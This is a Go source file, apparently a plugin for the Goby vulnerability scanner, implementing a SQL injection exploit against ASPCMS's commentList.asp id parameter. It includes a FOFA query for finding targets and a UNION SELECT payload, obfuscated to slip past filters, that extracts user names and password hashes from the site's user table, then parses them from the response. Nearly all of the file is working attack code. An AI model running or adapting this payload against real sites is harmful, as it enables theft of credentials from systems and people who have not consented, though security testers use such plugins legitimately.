package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "ASPCMS commentList.asp 文件 id 参数 SQL 注入漏洞",
    "Description": "<p>ASPCMS是由上谷网络开发的全新内核的开源企业建站系统。</p><p>ASPCMS commentList.asp 文件 id 参数存在 sql 注入漏洞，攻击者可以利用该漏洞获取数据库中的敏感信息。</p>",
    "Product": "ASPCMS",
    "Homepage": "http://www.aspcms.com/",
    "DisclosureDate": "2021-09-01",
    "Author": "keeeee",
    "FofaQuery": "(title=\"Powered by ASPCMS\" || body=\"content=\\\"ASPCMS\" || body=\"/inc/AspCms_AdvJs.asp\")",
    "Level": "2",
    "Impact": "<p>官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"http://www.aspcms.com/\">http://www.aspcms.com/</a></p><p>1、部署Web应用防火墙，对数据库操作进行监控。</p><p>2、如非必要，禁止公网访问该系统。</p>",
    "Recommendation": "<p>官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"http://www.aspcms.com/\">http://www.aspcms.com/</a></p><p>1、部署Web应用防火墙，对数据库操作进行监控。</p><p>2、如非必要，禁止公网访问该系统。</p>",
    "References": [
        "https://www.dtmao.cc/news_show_1965268.shtml",
        "https://www.safeinfo.me/2019/07/22/aspcms-lou-dong-ji-he.html"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "unmasterion semasterlect top 1 UserID,GroupID,LoginName,Password,now(),null,1  frmasterom {prefix}user"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL注入"
    ],
    "CVEIDs": [],
    "CVSSScore": "8.5",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "VulType": [
        "SQL注入"
    ],
    "GobyQuery": "(title=\"Powered by ASPCMS\" || body=\"content=\\\"ASPCMS\" || body=\"/inc/AspCms_AdvJs.asp\")",
    "PocId": "9920"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/plug/comment/commentList.asp"
			payload := "?id=-1 unmasterion semasterlect top 1 UserID,GroupID,LoginName,Password,now(),null,1  frmasterom {prefix}user"
			uri = fmt.Sprintf("%s%s", uri, strings.Replace(payload, " ", "%20", -1))
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "IP") && strings.Contains(resp.Utf8Html, `class="line2"`)
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			uri := "/plug/comment/commentList.asp"
			cmd := ss.Params["cmd"].(string)
			payload := fmt.Sprintf("?id=-1 %s", cmd)
			uri = fmt.Sprintf("%s%s", uri, strings.Replace(payload, " ", "%20", -1))
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					expResult.Success = true
					line1 := regexp.MustCompile(`<div class="line1"><span>(.*?)</div>`).FindStringSubmatch(resp.Utf8Html)[1]
					line1 = strings.Replace(line1, `</span>`, "", -1)
					line2 := regexp.MustCompile(`<div class="line2">(.*?)</div>`).FindStringSubmatch(resp.Utf8Html)[1]
					expResult.Output = fmt.Sprintf("%s\n%s", line1, line2)
				}
			}
			return expResult
		},
	))

}
